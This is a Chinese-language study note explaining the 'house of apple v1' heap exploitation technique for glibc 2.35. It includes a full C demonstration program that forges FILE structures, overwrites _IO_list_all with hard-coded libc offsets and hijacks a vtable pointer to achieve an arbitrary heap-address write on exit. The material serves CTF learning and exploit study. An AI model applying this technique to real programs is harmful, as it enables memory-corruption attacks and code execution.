---
title: glibc 2.35 pwn——house of apple v1 示例程序
date: 2023-02-28 22:15:00
categories:
- 学习笔记
- glibc 系列
---
house of apple这种利用方式针对于新版的glibc，在[这个资料](https://bbs.kanxue.com/thread-273418.htm)中有详细的分析与说明。这里根据该资料进行简单总结，并编写示例程序便于理解。

在house of pig中，我们需要使用两次large bin attack攻击作为前菜，第一次需要修改``_IO_list_all``指针的值，第二次需要修改`__free_hook`附近空间的值。而与之形成对比的是，house of apple只需要1次large bin attack即可完成攻击。这里需要注意：<font color=red>**house of apple并不是一个可以直接getshell的攻击方式，它更像是一种攻击思路，一种只使用一次large bin attack进行FSOP的思路，在house of apple之后可以接上多种多样的攻击方式来达到我们最终的目的。考虑到与`FILE`结构体有关的函数有很多都是可以利用的，因此在具体的情境下，攻击的流程一般较为灵活。**</font>

> 使用house of apple的条件为：
1、程序从main函数返回或能调用exit函数
2、能泄露出heap地址和libc地址
3、 能使用一次largebin attack（一次即可）

house of apple v1通过exit函数触发，exit调用到`_IO_flush_all_lockp`，后者遍历`_IO_list_all`中的`FILE`结构体并依次执行跳表中的overflow函数。在本利用方式中，使用伪造的`FILE`结构体，`vtable`填写`_IO_wstrn_jumps`，这样可以执行到`_IO_wstrn_overflow`函数，而`_IO_wstrn_overflow`会进行一系列赋值操作，将假`FILE`结构体的`_wide_data`字段保存的地址附近写入多个值。

具体的利用方式详见下面的示例程序，在开头提到的资料中还有针对house of apple攻击后的一系列可能的后续操作。

```c
//
// Created by root on 23-1-10.
//
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <sys/mman.h>

#define BLACK       "30"
#define RED         "31"
#define GREEN       "32"
#define YELLOW      "33"
#define BLUE        "34"
#define PURPLE      "35"
#define GREEN_DARK  "36"
#define WHITE       "37"

#define UNDEFINED   "-"
#define HIGHLIGHT   "1"
#define UNDERLINE   "4"
#define SPARK       "5"

#define STR_END      "\033[0m"

size_t victim[0x20];

void printf_color(char* color, char* effect, char* string){
    char buffer[0x1000] = {0};
    strcpy(buffer, "\033[");
    if(effect[0] != '-'){
        strcat(buffer, effect);
        strcat(buffer, ";");
    }
    strcat(buffer, color);
    strcat(buffer, "m");
    strcat(buffer, string);
    printf("%s" STR_END, buffer);
}

void print_binary(char* buf, int length){
    printf("---------------------------------------------------------------------------\n");
    printf("Address info starting in %p:\n", buf);
    int index = 0;
    char output_buffer[80];
    memset(output_buffer, '\0', 80);
    memset(output_buffer, ' ', 0x10);
    for(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){
        char temp_buffer[0x10];
        memset(temp_buffer, '\0', 0x10);
        sprintf(temp_buffer, "%#5x", index);
        strcpy(output_buffer, temp_buffer);
        output_buffer[5] = ' ';
        output_buffer[6] = '|';
        output_buffer[7] = ' ';
        for(int j=0; j<16; j++){
            if(index+j >= length)
                sprintf(output_buffer+8+3*j, "   ");
            else{
                sprintf(output_buffer+8+3*j, "%02x ", ((int)buf[index+j]) & 0xFF);
                if(!isprint(buf[index+j]))
                    output_buffer[58+j] = '.';
                else
                    output_buffer[58+j] = buf[index+j];
            }
        }
        output_buffer[55] = ' ';
        output_buffer[56] = '|';
        output_buffer[57] = ' ';
        printf("%s\n", output_buffer);
        memset(output_buffer+58, '\0', 16);
        index += 16;
    }
    printf("---------------------------------------------------------------------------\n");
}

void print_victim(){
    printf_color(YELLOW, HIGHLIGHT, "修改后：\n");
    print_binary((char*)victim, 0x80);
}

int main(){
    printf_color(GREEN, UNDEFINED, "本程序用于演示house of apple v1利用方式。\n");
    printf_color(YELLOW, HIGHLIGHT, "测试于ubuntu 22.04，glibc版本：Ubuntu GLIBC 2.35-0ubuntu3.1。\n");
    printf_color(GREEN, UNDEFINED, "house of apple并不是一个能直接getshell的攻击方式，它的功能是在任意地址写堆地址。\n");
    printf_color(GREEN, UNDEFINED, "在很多赛题中，house of apple只是一个引子，"
                                                        "在第一个FILE后面接其他的FILE结构体可以实现多种方式的利用。\n");
    printf_color(GREEN, UNDEFINED, "本演示程序就是利用第二个伪造的FILE结构体打印house of apple的攻击效果。\n");
    printf_color(GREEN, UNDEFINED, "在house of apple v1中，利用的核心思想是FILE结构体中的_wide_data字段。\n");
    printf_color(GREEN, UNDEFINED, "再一次重温FILE结构体的内容：\n\n");

    printf_color(BLUE, HIGHLIGHT, "(/libio/libioP.h, line 334)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "struct _IO_FILE_complete_plus\n"
                 "{\n"
                 "  struct _IO_FILE_complete file;\n"
                 "  const struct _IO_jump_t *vtable;\n"
                 "};\n\n");

    printf_color(BLUE, HIGHLIGHT, "(/libio/libioP.h, line 324)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "struct _IO_FILE_plus\n"
                 "{\n"
                 "  FILE file;\n"
                 "  const struct _IO_jump_t *vtable;\n"
                 "};\n\n");

    printf_color(BLUE, HIGHLIGHT, "(/libio/bits/types/struct_FILE.h, line 85)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "struct _IO_FILE_complete\n"
                 "{\n"
                 "  struct _IO_FILE _file;\n"
                 "#endif\n"
                 "  __off64_t _offset;\n"
                 "  /* Wide character stream stuff.  */\n"
                 "  struct _IO_codecvt *_codecvt;\n"
                 "  struct _IO_wide_data *_wide_data;\n"
                 "  struct _IO_FILE *_freeres_list;\n"
                 "  void *_freeres_buf;\n"
                 "  size_t __pad5;\n"
                 "  int _mode;\n"
                 "  /* Make sure we don't get into trouble again.  */\n"
                 "  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];\n"
                 "};\n\n");

    printf_color(BLUE, HIGHLIGHT, "(/libio/bits/types/struct_FILE.h, line 49)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "struct _IO_FILE\n"
                 "{\n"
                 "  int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */\n"
                 "\n"
                 "  /* The following pointers correspond to the C++ streambuf protocol. */\n"
                 "  char *_IO_read_ptr;\t/* Current read pointer */\n"
                 "  char *_IO_read_end;\t/* End of get area. */\n"
                 "  char *_IO_read_base;\t/* Start of putback+get area. */\n"
                 "  char *_IO_write_base;\t/* Start of put area. */\n"
                 "  char *_IO_write_ptr;\t/* Current put pointer. */\n"
                 "  char *_IO_write_end;\t/* End of put area. */\n"
                 "  char *_IO_buf_base;\t/* Start of reserve area. */\n"
                 "  char *_IO_buf_end;\t/* End of reserve area. */\n"
                 "\n"
                 "  /* The following fields are used to support backing up and undo. */\n"
                 "  char *_IO_save_base; /* Pointer to start of non-current get area. */\n"
                 "  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n"
                 "  char *_IO_save_end; /* Pointer to end of non-current get area. */\n"
                 "\n"
                 "  struct _IO_marker *_markers;\n"
                 "\n"
                 "  struct _IO_FILE *_chain;\n"
                 "\n"
                 "  int _fileno;\n"
                 "  int _flags2;\n"
                 "  __off_t _old_offset; /* This used to be _offset but it's too small.  */\n"
                 "\n"
                 "  /* 1+column number of pbase(); 0 is unknown. */\n"
                 "  unsigned short _cur_column;\n"
                 "  signed char _vtable_offset;\n"
                 "  char _shortbuf[1];\n"
                 "\n"
                 "  _IO_lock_t *_lock;\n"
                 "#ifdef _IO_USE_OLD_IO_FILE\n"
                 "};\n\n");

    printf_color(GREEN, UNDEFINED, "我们需要使用伪造的_IO_FILE_complete_plus结构体，并将这个伪造结构体的地址写到_IO_list_all。\n");
    printf_color(GREEN, UNDEFINED, "在调用exit函数后，结构体需要执行_IO_wstrn_overflow函数，这需要vtable填入_IO_wstrn_jumps的地址。\n\n");

    printf_color(BLUE, HIGHLIGHT, "(/libio/vswprintf.c, line 33)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "static wint_t\n"
                 "_IO_wstrn_overflow (FILE *fp, wint_t c)\n"
                 "{\n"
                 "  /* When we come to here this means the user supplied buffer is\n"
                 "     filled.  But since we must return the number of characters which\n"
                 "     would have been written in total we must provide a buffer for\n"
                 "     further use.  We can do this by writing on and on in the overflow\n"
                 "     buffer in the _IO_wstrnfile structure.  */\n"
                 "  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;\n"
                 "\n"
                 "\033[1;31m  if (fp->_wide_data->_IO_buf_base != snf->overflow_buf)\n"
                 "    {\n"
                 "      _IO_wsetb (fp, snf->overflow_buf,\n"
                 "\t\t snf->overflow_buf + (sizeof (snf->overflow_buf)\n"
                 "\t\t\t\t      / sizeof (wchar_t)), 0);\n"
                 "\n"
                 "      fp->_wide_data->_IO_write_base = snf->overflow_buf;\n"
                 "      fp->_wide_data->_IO_read_base = snf->overflow_buf;\n"
                 "      fp->_wide_data->_IO_read_ptr = snf->overflow_buf;\n"
                 "      fp->_wide_data->_IO_read_end = (snf->overflow_buf\n"
                 "\t\t\t\t      + (sizeof (snf->overflow_buf)\n"
                 "\t\t\t\t\t / sizeof (wchar_t)));\n"
                 "    }\n"
                 "\n"
                 "  fp->_wide_data->_IO_write_ptr = snf->overflow_buf;\n"
                 "  fp->_wide_data->_IO_write_end = snf->overflow_buf;\n"
                 "\n\033[1;" PURPLE "m"
                 "  /* Since we are not really interested in storing the characters\n"
                 "     which do not fit in the buffer we simply ignore it.  */\n"
                 "  return c;\n"
                 "}\n\n");

    printf_color(GREEN, UNDEFINED, "下面是_wide_data字段的结构体内容：\n\n");

    printf_color(BLUE, HIGHLIGHT, "(/libio/libio.h, line 121)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "struct _IO_wide_data\n"
                 "{\n"
                 "  wchar_t *_IO_read_ptr;\t/* Current read pointer */\n"
                 "  wchar_t *_IO_read_end;\t/* End of get area. */\n"
                 "  wchar_t *_IO_read_base;\t/* Start of putback+get area. */\n"
                 "  wchar_t *_IO_write_base;\t/* Start of put area. */\n"
                 "  wchar_t *_IO_write_ptr;\t/* Current put pointer. */\n"
                 "  wchar_t *_IO_write_end;\t/* End of put area. */\n"
                 "  wchar_t *_IO_buf_base;\t/* Start of reserve area. */\n"
                 "  wchar_t *_IO_buf_end;\t\t/* End of reserve area. */\n"
                 "  /* The following fields are used to support backing up and undo. */\n"
                 "  wchar_t *_IO_save_base;\t/* Pointer to start of non-current get area. */\n"
                 "  wchar_t *_IO_backup_base;\t/* Pointer to first valid character of\n"
                 "\t\t\t\t   backup area */\n"
                 "  wchar_t *_IO_save_end;\t/* Pointer to end of non-current get area. */\n"
                 "\n"
                 "  __mbstate_t _IO_state;\n"
                 "  __mbstate_t _IO_last_state;\n"
                 "  struct _IO_codecvt _codecvt;\n"
                 "\n"
                 "  wchar_t _shortbuf[1];\n"
                 "\n"
                 "  const struct _IO_jump_t *_wide_vtable;\n"
                 "};\n\n");

    printf_color(GREEN, UNDEFINED, "注意红色部分的代码，在假结构体中，我们可以控制_wide_data指针的值，因此可以实现在任意位置写入任意值。\n");
    printf_color(GREEN, UNDEFINED, "下面是_IO_wstrnfile结构体的定义部分：\n\n");

    printf_color(BLUE, HIGHLIGHT, "(/libio/strfile.h, line 49)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "struct _IO_streambuf\n"
                 "{\n"
                 "  FILE _f;\n"
                 "  const struct _IO_jump_t *vtable;\n"
                 "};\n"
                 "\n"
                 "typedef struct _IO_strfile_\n"
                 "{\n"
                 "  struct _IO_streambuf _sbf;\n"
                 "  struct _IO_str_fields _s;\n"
                 "} _IO_strfile;\n"
                 "\n"
                 "/* frozen: set when the program has requested that the array object not\n"
                 "   be altered, reallocated, or freed. */\n"
                 "#define _IO_STR_FROZEN(FP) ((FP)->_f._flags & _IO_USER_BUF)\n"
                 "\n"
                 "typedef struct\n"
                 "{\n"
                 "  _IO_strfile f;\n"
                 "  /* This is used for the characters which do not fit in the buffer\n"
                 "     provided by the user.  */\n"
                 "  char overflow_buf[64];\n"
                 "} _IO_strnfile;\n"
                 "\n"
                 "extern const struct _IO_jump_t _IO_strn_jumps attribute_hidden;\n"
                 "\n"
                 "\n"
                 "typedef struct\n"
                 "{\n"
                 "  _IO_strfile f;\n"
                 "  /* This is used for the characters which do not fit in the buffer\n"
                 "     provided by the user.  */\n"
                 "  wchar_t overflow_buf[64];\n"
                 "} _IO_wstrnfile;\n\n");

    printf_color(GREEN, UNDEFINED, "可以看到写入的地址值也是我们可以控制的。\n");
    printf_color(GREEN, UNDEFINED, "需要注意的是，");
    printf_color(RED, HIGHLIGHT, "_IO_wstrn_overflow函数在IDA中的符号表中并不存在。\n");
    printf_color(GREEN, UNDEFINED, "因此在调试时最好可以添加glibc的源码辅助进行调试，效果更好。"
                                                        "使用dir + 源码目录即可添加源码。\n");
    printf_color(GREEN, UNDEFINED, "另外，可以通过https://libc.rip/查询到所有符号的偏移，"
                                                        "但数据库中尚未保存本测试环境使用的新版本的libc。\n");
    printf_color(GREEN, UNDEFINED, "通过对_IO_wstrn_jumps跳转表的定义可以大致筛选出_IO_wstrn_jumps的几个地址。\n");
    printf_color(GREEN, UNDEFINED, "在__libc_IO_vtables段进行查询，可以找到两个候选的地址：0x82F80和0x847C0。\n");
    printf_color(GREEN, UNDEFINED, "对应3个不同的_IO_jump_t结构体：0x215DC0、0x215E80、0x216180。\n");
    printf_color(GREEN, UNDEFINED, "经过gdb调试可知，_IO_wstrn_jumps的地址偏移应为0x215DC0，_IO_wstrn_overflow为0x82F80。\n\n");

    printf_color(GREEN, UNDEFINED, "我们首先获取libc地址和基地址。\n");

    size_t libc_base = (size_t)puts - 0x80ED0;  // puts函数的偏移
    FILE* fake_FILE = malloc(0x400);

    printf_color(BLUE, HIGHLIGHT, "libc基地址：");
    printf("\033[1;" BLUE "m%#zx\n" STR_END, libc_base);
    printf_color(BLUE, HIGHLIGHT, "堆地址：");
    printf("\033[1;" BLUE "m%#zx\n\n" STR_END, (size_t)fake_FILE);

    printf_color(GREEN, UNDEFINED, "下面，我们将malloc出来的地址作为假_IO_FILE_complete_plus的地址，并修改_IO_list_all。\n\n");

    printf_color(BLUE, HIGHLIGHT, "(/libio/genops.c， line 684)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "int\n"
                 "_IO_flush_all_lockp (int do_lock)\n"
                 "{\n"
                 "  int result = 0;\n"
                 "  FILE *fp;\n"
                 "\n"
                 "#ifdef _IO_MTSAFE_IO\n"
                 "  _IO_cleanup_region_start_noarg (flush_cleanup);\n"
                 "  _IO_lock_lock (list_all_lock);\n"
                 "#endif\n"
                 "\n"
                 "  \033[1;31mfor (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)\n"
                 "    {\n"
                 "      run_fp = fp;\n"
                 "      if (do_lock)\n"
                 "\t_IO_flockfile (fp);\n"
                 "\n"
                 "      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)\n"
                 "\t   || (_IO_vtable_offset (fp) == 0\n"
                 "\t       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr\n"
                 "\t\t\t\t    > fp->_wide_data->_IO_write_base))\n"
                 "\t   )\n"
                 "\t  && _IO_OVERFLOW (fp, EOF) == EOF)\n"
                 "\tresult = EOF;\n"
                 "\n"
                 "      if (do_lock)\n"
                 "\t_IO_funlockfile (fp);\n"
                 "      run_fp = NULL;\n"
                 "    }\n\033[1;" PURPLE "m"
                 "\n"
                 "#ifdef _IO_MTSAFE_IO\n"
                 "  _IO_lock_unlock (list_all_lock);\n"
                 "  _IO_cleanup_region_end (0);\n"
                 "#endif\n"
                 "\n"
                 "  return result;\n"
                 "}\n\n");

    printf_color(GREEN, HIGHLIGHT, "依然需要注意_IO_flush_all_lockp中的判断条件。\n\n");

    fake_FILE->_mode = 0;
    fake_FILE->_IO_write_ptr = (char*)1;
    fake_FILE->_IO_write_base = (char*)0;
    ((size_t*)fake_FILE)[0xd8 / 8] = libc_base + 0x215DC0;
    size_t* IO_list_all = (size_t *) (libc_base + 0x21A680);
    *IO_list_all = (size_t)fake_FILE;

    printf_color(GREEN, UNDEFINED, "我们想要修改的地址为：");
    printf("\033[1;" RED "m%#zx\n" STR_END, (size_t)victim);

    printf_color(GREEN, UNDEFINED, "下面是通过GDB查看到的_IO_wstrn_overflow函数的汇编：\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "=> 0x7ffff7e02f80 <_IO_wstrn_overflow>:\tendbr64 \n"
                 "   0x7ffff7e02f84 <_IO_wstrn_overflow+4>:\tpush   r12\n"
                 "   0x7ffff7e02f86 <_IO_wstrn_overflow+6>:\tmov    r12d,esi\n"
                 "   0x7ffff7e02f89 <_IO_wstrn_overflow+9>:\t\033[1;31mlea    rsi,[rdi+0xf0]\n\033[1;" PURPLE "m"
                 "   0x7ffff7e02f90 <_IO_wstrn_overflow+16>:\tpush   rbx\n"
                 "   0x7ffff7e02f91 <_IO_wstrn_overflow+17>:\tmovq   xmm0,rsi\n"
                 "   0x7ffff7e02f96 <_IO_wstrn_overflow+22>:\tpunpcklqdq xmm0,xmm0\n"
                 "   0x7ffff7e02f9a <_IO_wstrn_overflow+26>:\tsub    rsp,0x28\n"
                 "   0x7ffff7e02f9e <_IO_wstrn_overflow+30>:\t\033[1;31mmov    rdx,QWORD PTR [rdi+0xa0]\n\033[1;" PURPLE "m"
                 "   0x7ffff7e02fa5 <_IO_wstrn_overflow+37>:\t\033[1;31mcmp    QWORD PTR [rdx+0x30],rsi\n\033[1;" PURPLE "m"
                 "   0x7ffff7e02fa9 <_IO_wstrn_overflow+41>:\tje     0x7ffff7e02fec <_IO_wstrn_overflow+108>\n"
                 "   0x7ffff7e02fab <_IO_wstrn_overflow+43>:\tmovq   xmm1,rsi\n"
                 "   0x7ffff7e02fb0 <_IO_wstrn_overflow+48>:\tmov    rbx,rdi\n"
                 "   0x7ffff7e02fb3 <_IO_wstrn_overflow+51>:\txor    ecx,ecx\n"
                 "   0x7ffff7e02fb5 <_IO_wstrn_overflow+53>:\tmovaps XMMWORD PTR [rsp+0x10],xmm0\n"
                 "   0x7ffff7e02fba <_IO_wstrn_overflow+58>:\tlea    rdx,[rdi+0x1f0]\n"
                 "   0x7ffff7e02fc1 <_IO_wstrn_overflow+65>:\tmovq   xmm2,rdx\n"
                 "   0x7ffff7e02fc6 <_IO_wstrn_overflow+70>:\tpunpcklqdq xmm1,xmm2\n"
                 "   0x7ffff7e02fca <_IO_wstrn_overflow+74>:\tmovaps XMMWORD PTR [rsp],xmm1\n"
                 "   0x7ffff7e02fce <_IO_wstrn_overflow+78>:\tcall   0x7ffff7e03610 <__GI__IO_wsetb>\n"
                 "   0x7ffff7e02fd3 <_IO_wstrn_overflow+83>:\tmovdqa xmm1,XMMWORD PTR [rsp]\n"
                 "   0x7ffff7e02fd8 <_IO_wstrn_overflow+88>:\tmov    rdx,QWORD PTR [rbx+0xa0]\n"
                 "   0x7ffff7e02fdf <_IO_wstrn_overflow+95>:\tmovdqa xmm0,XMMWORD PTR [rsp+0x10]\n"
                 "   0x7ffff7e02fe5 <_IO_wstrn_overflow+101>:\tmovups XMMWORD PTR [rdx],xmm1\n"
                 "   0x7ffff7e02fe8 <_IO_wstrn_overflow+104>:\tmovups XMMWORD PTR [rdx+0x10],xmm0\n"
                 "   0x7ffff7e02fec <_IO_wstrn_overflow+108>:\tmovups XMMWORD PTR [rdx+0x20],xmm0\n"
                 "   0x7ffff7e02ff0 <_IO_wstrn_overflow+112>:\tadd    rsp,0x28\n"
                 "   0x7ffff7e02ff4 <_IO_wstrn_overflow+116>:\tmov    eax,r12d\n"
                 "   0x7ffff7e02ff7 <_IO_wstrn_overflow+119>:\tpop    rbx\n"
                 "   0x7ffff7e02ff8 <_IO_wstrn_overflow+120>:\tpop    r12\n"
                 "   0x7ffff7e02ffa <_IO_wstrn_overflow+122>:\tret\n\n");

    printf_color(GREEN, UNDEFINED, "上面的红色部分就是函数中的if语句比较部分，可见overflow_buf在结构体中的偏移量为0xF0。\n");
    printf_color(GREEN, UNDEFINED, "另外看一下_IO_wsetb函数：\n\n");

    printf_color(BLUE, HIGHLIGHT, "(/libio/wgenops.c, line 91)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "void\n"
                 "_IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a)\n"
                 "{\n"
                 "  if (f->_wide_data->_IO_buf_base && !(f->_flags2 & _IO_FLAGS2_USER_WBUF))\n"
                 "    free (f->_wide_data->_IO_buf_base);\n"
                 "  f->_wide_data->_IO_buf_base = b;\n"
                 "  f->_wide_data->_IO_buf_end = eb;\n"
                 "  if (a)\n"
                 "    f->_flags2 &= ~_IO_FLAGS2_USER_WBUF;\n"
                 "  else\n"
                 "    f->_flags2 |= _IO_FLAGS2_USER_WBUF;\n"
                 "}\n\n");

    printf_color(GREEN, UNDEFINED, "显然这里如果我们要伪造_wide_data，就必须绕过第一个if语句。\n");
    printf_color(GREEN, UNDEFINED, "如果要写入的地址一开始的_IO_buf_base处就是0，那么这个语句可以直接跳过。\n");
    printf_color(GREEN, UNDEFINED, "但更多时候这里的值可能不是确定的，因此需要第二个判断条件。\n");
    printf_color(GREEN, UNDEFINED, "_IO_FLAGS2_USER_WBUF的值为8，即让f->_flags2 & 8 != 0即可。\n");

    fake_FILE->_flags2 = 0x8;

    printf_color(GREEN, UNDEFINED, "我们将这里修改为目标地址。\n");

    fake_FILE->_wide_data = (struct _IO_wide_data *) (char *) victim;

    printf_color(YELLOW, HIGHLIGHT, "修改前：\n");
    print_binary((char*)victim, 0x80);

    printf_color(GREEN, UNDEFINED, "为了能够在exit函数调用后看到修改后的目标地址内容，需要另外一个假FILE结构体。\n");
    printf_color(GREEN, UNDEFINED, "实际上在house of apple之后，也多使用另一个FILE结构体进行其他的操作。\n");
    printf_color(GREEN, UNDEFINED, "将第二个假FILE结构体地址填到第一个FILE的_chain字段，使两者链接。\n");
    printf_color(GREEN, UNDEFINED, "第二个结构体使用另外一个_IO_jumps_t指针。\n");

    FILE* fake_FILE_2 = malloc(0x400);
    fake_FILE->_chain = fake_FILE_2;

    mprotect((void*)(libc_base + 0x215000), 0x4000, PROT_READ | PROT_WRITE);

    printf_color(GREEN, UNDEFINED, "本程序为了方便起见，选择直接修改vtable段为可写，"
                                                        "并修改第二个FILE使用的_IO_jumps_t中的overflow指针。\n");
    size_t* other_IO_jumps = (size_t*)(libc_base + 0x215E80);
    other_IO_jumps[3] = (size_t)print_victim;

    fake_FILE_2->_mode = 0;
    fake_FILE_2->_IO_write_ptr = (char*)1;
    fake_FILE_2->_IO_write_base = (char*)0;
    ((size_t*)fake_FILE_2)[0xd8 / 8] = libc_base + 0x215E80;
    fake_FILE_2->_flags2 = 0x8;
    fake_FILE_2->_wide_data = (struct _IO_wide_data *) (char *) victim;

    exit(-1);
}
```
